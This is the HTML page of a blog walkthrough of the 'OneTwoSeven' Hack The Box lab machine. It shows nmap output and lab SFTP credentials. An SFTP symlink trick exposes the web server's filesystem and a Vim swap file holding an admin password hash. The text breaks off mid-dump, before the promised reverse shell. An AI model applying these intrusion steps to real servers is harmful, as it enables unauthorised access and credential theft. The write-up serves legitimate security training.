@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>OneTwoSeven - Flavien Jaquerod</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="An almost complete walkthrough of the hard linux `HTB` box: `OneTwoSeven`.  From initial enumeration to getting a reverse shell, and starting privilege escalation.">
+		<meta property="og:url" content="http://localhost:1313/posts/onetwoseven/">
+  <meta property="og:site_name" content="Flavien Jaquerod">
+  <meta property="og:title" content="OneTwoSeven">
+  <meta property="og:description" content="An almost complete walkthrough of the hard linux `HTB` box: `OneTwoSeven`.  From initial enumeration to getting a reverse shell, and starting privilege escalation.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-02-14T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-02-14T00:00:00+00:00">
+    <meta property="article:tag" content="Box">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Machine">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="SFTP">
+    <meta property="article:tag" content="Symlink">
+
+		
+  <meta itemprop="name" content="OneTwoSeven">
+  <meta itemprop="description" content="An almost complete walkthrough of the hard linux `HTB` box: `OneTwoSeven`.  From initial enumeration to getting a reverse shell, and starting privilege escalation.">
+  <meta itemprop="datePublished" content="2024-02-14T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-02-14T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2585">
+  <meta itemprop="keywords" content="Box,CTF,Machine,HTB,SFTP,Symlink,Hard">
+		
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="OneTwoSeven">
+  <meta name="twitter:description" content="An almost complete walkthrough of the hard linux `HTB` box: `OneTwoSeven`.  From initial enumeration to getting a reverse shell, and starting privilege escalation.">
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	<link rel="stylesheet" href="/css/custom.css">
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo logo--mixed">
+		<a class="logo__link" href="/" title="A bunch of cybersecurity stuff" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="/img/Icon.webp">
+				</div><div class="logo__item logo__text">
+					<div class="logo__title">A bunch of cybersecurity stuff</div>
+					<div class="logo__tagline">ZeroDay Chronicles</div>
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="/">
+				
+				<span class="menu__text">Home</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/about/">
+				
+				<span class="menu__text">About</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/posts/">
+				
+				<span class="menu__text">Posts</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/news/">
+				
+				<span class="menu__text">News</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/cheatsheets/">
+				
+				<span class="menu__text">Cheat Sheets</span>
+				
+			</a>
+		</li>
+	</ul>
+</nav>
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">OneTwoSeven</h1>
+			<div class="post__meta meta"><div class="meta__item-author meta__item">
+	<svg class="meta__icon icon icon-author" width="16" height="16" viewBox="0 0 16 16"><path d="M8 1c2 0 3.5 2 3.5 4.5S10 9 10 9c3 1 4 2 4 6H2c0-4 1-5 4-6 0 0-1.5-1-1.5-3.5S6 1 8 1"/></svg><span class="meta__text">Flavien Jaquerod</span>
+</div>
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0a14 14 0 1 1 0 28 1 1 0 0 1 0-28m0 3a3 3 0 1 0 0 22 3 3 0 0 0 0-22m1 4h-2v8.4l6.8 4.4L22 18l-6-3.8z"/></svg><time class="meta__text" datetime="2024-02-14T00:00:00Z">2024-02-14</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2 1 2h8v11H0V2z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/box/" rel="category">Box</a>, <a class="meta__link" href="/categories/machine/" rel="category">Machine</a>, <a class="meta__link" href="/categories/writeup/" rel="category">Writeup</a>
+	</span>
+</div></div>
+		</header>
+		
+<div class="post__toc toc">
+	<div class="toc__title">Page content</div>
+	<div class="toc__menu">
+		<nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#website">Website</a></li>
+        <li><a href="#sftp">SFTP</a></li>
+        <li><a href="#admin-panel">Admin panel</a></li>
+      </ul>
+    </li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege escalation</a>
+      <ul>
+        <li><a href="#man-in-the-middle-attack">Man in the middle attack</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+	</div>
+</div><div class="content post__content clearfix">
+			<h2 id="enumeration">Enumeration</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE REASON         VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 9.2p1 Debian 2+deb12u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 32:b7:f3:e2:6d:ac:94:3e:6f:11:d8:05:b9:69:58:45 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFTThOIf++CjOW9k0u9QGq2ocQ/VZZsMqhDsylciI5ZBNguOuOTAP+isLEikqZoa4inOlAqkD6r8sDhRZilSLyI<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 35:52:04:dc:32:69:1a:b7:52:76:06:e3:6c:17:1e:ad <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMIeKC0uIrZ+sRG5K3tk7RH5HszmPp1Zt4T9yPw4CjaJ
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">63</span> Apache httpd 2.4.25 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: POST OPTIONS HEAD GET
+</span></span><span style="display:flex;"><span>|_http-title: Page moved.
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.25 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>From the nmap scan, we discover 2 open ports: one running ssh and another one running http, we can notice the <code>Apache/2.4.25</code>version that seems outdated and a quick <a href="https://lwn.net/Articles/709890/">google search</a> shows that it is old
+==&gt; We can immediately head over to it and see what it is about</p>
+<h3 id="website">Website</h3>
+<p>After some exploration of the website, we find these pages:</p>
+<p><img src="OneTwoSeven_landing.png" alt="">
+<img src="OneTwoSeven_stats.png" alt="">
+<img src="OTS_signup.png" alt=""></p>
+<p>The last one seems particularly interesting as we get some credentials:</p>
+<ul>
+<li><code>ots-iOTdjZWI</code> - <code>72b97ceb</code>
+And we also notice that they mention: <code>sftp://onetwoseven.htb</code> and a link to our home page. Going over to it shows us this page:</li>
+</ul>
+<p><img src="OTS_home.png" alt=""></p>
+<p>But it seems empty.</p>
+<p>==&gt; One thing also worth noticing is the disabled <code>Admin</code>button at the top. By examining the source code, we find this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;collapse navbar-collapse&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbarCollapse&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">ul</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbar-nav mr-auto&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">li</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-item active&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-link&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[/index.php](view-source:http://10.129.105.67/index.php)&#34;</span>&gt;Home&lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sr-only&#34;</span>&gt;(current)&lt;/<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">li</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">li</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-item&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-link&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[/stats.php](view-source:http://10.129.105.67/stats.php)&#34;</span>&gt;Statistics&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">li</span>&gt;
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!-- Only enable link if access from trusted networks admin/20190212 --&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!-- Added localhost admin/20190214 --&gt;</span>
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">li</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-item&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;adminlink&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-link disabled&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[http://onetwoseven.htb:60080/](view-source:http://onetwoseven.htb:60080/)&#34;</span>&gt;Admin&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">li</span>&gt;
+</span></span><span style="display:flex;"><span>	      &lt;/<span style="color:#f92672">ul</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span></code></pre></div><p>Where we can get: <code>http://onetwoseven.htb:60080</code>, unfortunately the website does not seem to be loading when accessing it directly.</p>
+<h3 id="sftp">SFTP</h3>
+<p>Using the provided credentials, we can login to the <code>SFTP</code>server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sftp ots-iOTdjZWI@10.129.105.67 
+</span></span></code></pre></div><p>Then we can look around for information and we see a file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sftp&gt; ls
+</span></span><span style="display:flex;"><span>public_html  
+</span></span><span style="display:flex;"><span>sftp&gt; cd public_html/
+</span></span><span style="display:flex;"><span>sftp&gt; ls
+</span></span><span style="display:flex;"><span>index.html  
+</span></span><span style="display:flex;"><span>sftp&gt; ls -la
+</span></span><span style="display:flex;"><span>drwxr-xr-x    ? <span style="color:#ae81ff">1001</span>     <span style="color:#ae81ff">1001</span>         <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x    ? <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">22</span> 21:28 ..
+</span></span><span style="display:flex;"><span>-rw-r--r--    ? <span style="color:#ae81ff">1001</span>     <span style="color:#ae81ff">1001</span>          <span style="color:#ae81ff">349</span> Feb <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> index.html
+</span></span></code></pre></div><p>We can then download this file to inspect it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sftp&gt; get index.html 
+</span></span><span style="display:flex;"><span>Fetching /public_html/index.html to index.html
+</span></span><span style="display:flex;"><span>index.html                                     100%  <span style="color:#ae81ff">349</span>     6.8KB/s   00:00    
+</span></span></code></pre></div><p>and we see that it contains:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">title</span>&gt;Nothing here.&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">body</span> { <span style="color:#66d9ef">margin</span>:<span style="color:#ae81ff">0</span>; <span style="color:#66d9ef">padding</span>:<span style="color:#ae81ff">0</span>; <span style="color:#66d9ef">background</span>:url(<span style="color:#e6db74">&#34;/dist/img/abstract-architecture-attractive-988873.jpg&#34;</span>) <span style="color:#66d9ef">no-repeat</span> <span style="color:#66d9ef">center</span> <span style="color:#66d9ef">center</span> <span style="color:#66d9ef">fixed</span>; <span style="color:#66d9ef">-webkit-</span><span style="color:#66d9ef">background-size</span>: <span style="color:#66d9ef">cover</span>; <span style="color:#66d9ef">-moz-</span><span style="color:#66d9ef">background-size</span>: <span style="color:#66d9ef">cover</span>; <span style="color:#66d9ef">-o-</span><span style="color:#66d9ef">background-size</span>: <span style="color:#66d9ef">cover</span>; <span style="color:#66d9ef">background-size</span>: <span style="color:#66d9ef">cover</span>; }&lt;/<span style="color:#f92672">style</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>&ndash;&gt; This seems to be a dead end. Now there is not much else we can do, so let&rsquo;s focus a bit more on the capabilities of <code>SFTP</code> -&gt; we can start by displaying the list of available commands:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sftp&gt; ?
+</span></span><span style="display:flex;"><span>Available commands:
+</span></span><span style="display:flex;"><span>bye                                Quit sftp
+</span></span><span style="display:flex;"><span>cd path                            Change remote directory to <span style="color:#e6db74">&#39;path&#39;</span>
+</span></span><span style="display:flex;"><span>chgrp <span style="color:#f92672">[</span>-h<span style="color:#f92672">]</span> grp path                Change group of file <span style="color:#e6db74">&#39;path&#39;</span> to <span style="color:#e6db74">&#39;grp&#39;</span>
+</span></span><span style="display:flex;"><span>chmod <span style="color:#f92672">[</span>-h<span style="color:#f92672">]</span> mode path               Change permissions of file <span style="color:#e6db74">&#39;path&#39;</span> to <span style="color:#e6db74">&#39;mode&#39;</span>
+</span></span><span style="display:flex;"><span>chown <span style="color:#f92672">[</span>-h<span style="color:#f92672">]</span> own path                Change owner of file <span style="color:#e6db74">&#39;path&#39;</span> to <span style="color:#e6db74">&#39;own&#39;</span>
+</span></span><span style="display:flex;"><span>copy oldpath newpath               Copy remote file
+</span></span><span style="display:flex;"><span>cp oldpath newpath                 Copy remote file
+</span></span><span style="display:flex;"><span>df <span style="color:#f92672">[</span>-hi<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>path<span style="color:#f92672">]</span>                    Display statistics <span style="color:#66d9ef">for</span> current directory or
+</span></span><span style="display:flex;"><span>                                   filesystem containing <span style="color:#e6db74">&#39;path&#39;</span>
+</span></span><span style="display:flex;"><span>exit                               Quit sftp
+</span></span><span style="display:flex;"><span>get <span style="color:#f92672">[</span>-afpR<span style="color:#f92672">]</span> remote <span style="color:#f92672">[</span>local<span style="color:#f92672">]</span>         Download file
+</span></span><span style="display:flex;"><span>help                               Display this help text
+</span></span><span style="display:flex;"><span>lcd path                           Change local directory to <span style="color:#e6db74">&#39;path&#39;</span>
+</span></span><span style="display:flex;"><span>lls <span style="color:#f92672">[</span>ls-options <span style="color:#f92672">[</span>path<span style="color:#f92672">]]</span>            Display local directory listing
+</span></span><span style="display:flex;"><span>lmkdir path                        Create local directory
+</span></span><span style="display:flex;"><span>ln <span style="color:#f92672">[</span>-s<span style="color:#f92672">]</span> oldpath newpath            Link remote file <span style="color:#f92672">(</span>-s <span style="color:#66d9ef">for</span> symlink<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>lpwd                               Print local working directory
+</span></span><span style="display:flex;"><span>ls <span style="color:#f92672">[</span>-1afhlnrSt<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>path<span style="color:#f92672">]</span>             Display remote directory listing
+</span></span><span style="display:flex;"><span>lumask umask                       Set local umask to <span style="color:#e6db74">&#39;umask&#39;</span>
+</span></span><span style="display:flex;"><span>mkdir path                         Create remote directory
+</span></span><span style="display:flex;"><span>progress                           Toggle display of progress meter
+</span></span><span style="display:flex;"><span>put <span style="color:#f92672">[</span>-afpR<span style="color:#f92672">]</span> local <span style="color:#f92672">[</span>remote<span style="color:#f92672">]</span>         Upload file
+</span></span><span style="display:flex;"><span>pwd                                Display remote working directory
+</span></span><span style="display:flex;"><span>quit                               Quit sftp
+</span></span><span style="display:flex;"><span>reget <span style="color:#f92672">[</span>-fpR<span style="color:#f92672">]</span> remote <span style="color:#f92672">[</span>local<span style="color:#f92672">]</span>        Resume download file
+</span></span><span style="display:flex;"><span>rename oldpath newpath             Rename remote file
+</span></span><span style="display:flex;"><span>reput <span style="color:#f92672">[</span>-fpR<span style="color:#f92672">]</span> local <span style="color:#f92672">[</span>remote<span style="color:#f92672">]</span>        Resume upload file
+</span></span><span style="display:flex;"><span>rm path                            Delete remote file
+</span></span><span style="display:flex;"><span>rmdir path                         Remove remote directory
+</span></span><span style="display:flex;"><span>symlink oldpath newpath            Symlink remote file
+</span></span><span style="display:flex;"><span>version                            Show SFTP version
+</span></span><span style="display:flex;"><span>!command                           Execute <span style="color:#e6db74">&#39;command&#39;</span> in local shell
+</span></span><span style="display:flex;"><span>!                                  Escape to local shell
+</span></span><span style="display:flex;"><span>?                                  Synonym <span style="color:#66d9ef">for</span> help
+</span></span></code></pre></div><p>Immediately, the <code>symlink</code>command seems interesting, as it allows us to create a link to a remote file, let&rsquo;s try that:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sftp&gt; symlink / public_html/root
+</span></span></code></pre></div><p>And this will create a <code>symlink</code> between the root of the website and <code>public_html/root</code>, we can then try to visit our own home page again, this time under <code>/root/</code>:</p>
+<p><img src="OTS_root.png" alt=""></p>
+<p>And this time we see something! We can then click around to explore the file system, and we quickly see that we get errors saying that we don&rsquo;t have enough permissions on everything except <code>var</code>:</p>
+<p><img src="OTS_perm.png" alt=""></p>
+<p>However, when exploring <code>/www</code>, we end up seeing:</p>
+<p><img src="OTS_www.png" alt=""></p>
+<p>And the <code>.login.php.swp</code>file seems intriguing -&gt; We can download it and have a look at it:
+First we can check what kind of file it is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file login.php.swp 
+</span></span><span style="display:flex;"><span>login.php.swp: Vim swap file, version 8.0, pid 1861, user root, host onetwoseven, file /var/www/html-admin/login.php
+</span></span></code></pre></div><p>and finally check its content:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>b0VIM 8.0      {u\k*  E  root                                    onetwoseven                             /var/www/html-admin/login.php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                utf-8
+</span></span><span style="display:flex;"><span> 3210    #&#34;! U                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 tp           N                                   P                            \                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ad  �       N       �  d  T  C  :    �  �  B    �
+</span></span><span style="display:flex;"><span>  �
+</span></span><span style="display:flex;"><span>  �
+</span></span><span style="display:flex;"><span>  w
+</span></span><span style="display:flex;"><span>  v
+</span></span><span style="display:flex;"><span>  j
+</span></span><span style="display:flex;"><span>  �  s  f  9  	  �  �  �  �  L  �
+</span></span><span style="display:flex;"><span>  a
+</span></span><span style="display:flex;"><span>  S
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  	
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>  �	  �	  �	  �	  �	  x	  -	  #	  	  �  �  �  O    �  �  �  �  �  J     �  �  r  (     �  �  �  �  �  �  3  2    
+</span></span><span style="display:flex;"><span>  �  �  �  �  8  (      �      =  <span style="color:#960050;background-color:#1e0010">&amp;</span>  �  �  �  �  �  �  |  u  C  �  �                                                                      	    &lt;<span style="color:#f92672">table</span>&gt;             &lt;<span style="color:#f92672">h4</span> <span style="color:#a6e22e">class </span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;form-signin-heading&#34;</span>&gt;&lt;<span style="color:#f92672">font</span> <span style="color:#a6e22e">size</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;-1&#34;</span> <span style="color:#a6e22e">color</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;red&#34;</span>&gt;<span style="color:#75715e">&lt;?php echo $msg; ?&gt;</span>&lt;/<span style="color:#f92672">font</span>&gt;&lt;/<span style="color:#f92672">h4</span>&gt;          &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/login.php&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span>&gt;              &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class </span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;container&#34;</span>&gt;              &lt;/<span style="color:#f92672">div</span>&gt; <span style="color:#75715e">&lt;!-- /container --&gt;</span>          ?&gt;             }               }     				       		    	      if ($_POST[&#39;username&#39;] == &#39;ots-admin&#39; <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> hash(&#39;sha256&#39;,$_POST[&#39;password&#39;]) == &#39;11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8&#39;) {             if (isset($_POST[&#39;login&#39;]) <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> !empty($_POST[&#39;username&#39;]) <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> !empty($_POST[&#39;password&#39;])) {                          $msg = &#39;&#39;;           <span style="color:#75715e">&lt;?php         &lt;h2 class=&#34;featurette-heading&#34;&gt;Login to the kingdom.&lt;span class=&#34;text-muted&#34;&gt; Up up and away!&lt;/span&gt;&lt;/h2&gt;       &lt;div class=&#34;col-md-12&#34;&gt;     &lt;div class=&#34;row featurette&#34;&gt;      &lt;!-- START THE FEATURETTES --&gt;    &lt;div class=&#34;container marketing&#34;&gt;    &lt;!-- Wrap the rest of the page in another container to center all the content. --&gt;   ================================================== --&gt;   &lt;!-- Marketing messaging and featurettes     &lt;/div&gt;     &lt;/a&gt;       &lt;span class=&#34;sr-only&#34;&gt;Next&lt;/span&gt;       &lt;span class=&#34;carousel-control-next-icon&#34; aria-hidden=&#34;true&#34;&gt;&lt;/span&gt;     &lt;a class=&#34;carousel-control-next&#34; href=&#34;#myCarousel&#34; role=&#34;button&#34; data-slide=&#34;next&#34;&gt;     &lt;/a&gt;       &lt;span class=&#34;sr-only&#34;&gt;Previous&lt;/span&gt;       &lt;span class=&#34;carousel-control-prev-icon&#34; aria-hidden=&#34;true&#34;&gt;&lt;/span&gt;     &lt;a class=&#34;carousel-control-prev&#34; href=&#34;#myCarousel&#34; role=&#34;button&#34; data-slide=&#34;prev&#34;&gt;     &lt;/div&gt;       &lt;/div&gt;         &lt;/div&gt;           &lt;/div&gt;             &lt;p&gt;Administration backend. For administrators only.&lt;/p&gt;             &lt;h1&gt;OneTwoSeven Administration&lt;/h1&gt;           &lt;div class=&#34;carousel-caption text-left&#34;&gt;         &lt;div class=&#34;container&#34;&gt;         &lt;img src=&#34;dist/img/ai-codes-coding-97077.jpg&#34;&gt;       &lt;div class=&#34;carousel-item active&#34;&gt;     &lt;div class=&#34;carousel-inner&#34;&gt;     &lt;/ol&gt;       &lt;li data-target=&#34;#myCarousel&#34; data-slide-to=&#34;0&#34; class=&#34;active&#34;&gt;&lt;/li&gt;     &lt;ol class=&#34;carousel-indicators&#34;&gt;   &lt;div id=&#34;myCarousel&#34; class=&#34;carousel slide&#34; data-ride=&#34;carousel&#34;&gt;  &lt;main role=&#34;main&#34;&gt;  &lt;/header&gt;   &lt;/nav&gt;     &lt;/div&gt;     &lt;div class=&#34;collapse navbar-collapse&#34; id=&#34;navbarCollapse&#34;&gt;     &lt;/button&gt;       &lt;span class=&#34;navbar-toggler-icon&#34;&gt;&lt;/span&gt;     &lt;button class=&#34;navbar-toggler&#34; type=&#34;button&#34; data-toggle=&#34;collapse&#34; data-target=&#34;#navbarCollapse&#34; aria-controls=&#34;navbarCollapse&#34; aria-expanded=&#34;false&#34; aria-label=&#34;Toggle navigation&#34;&gt;     &lt;a class=&#34;navbar-brand&#34; href=&#34;/login.php&#34;&gt;OneTwoSeven - Administration Backend&lt;/a&gt;   &lt;nav class=&#34;navbar navbar-expand-md navbar-dark fixed-top bg-dark&#34;&gt;     &lt;header&gt;   &lt;body&gt;   &lt;/head&gt;     &lt;link href=&#34;carousel.css&#34; rel=&#34;stylesheet&#34;&gt;     &lt;!-- Custom styles for this template --&gt;     &lt;/style&gt;       @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } }       .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }     &lt;style&gt;      &lt;link href=&#34;/dist/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34; crossorigin=&#34;anonymous&#34;&gt;     &lt;!-- Bootstrap core CSS 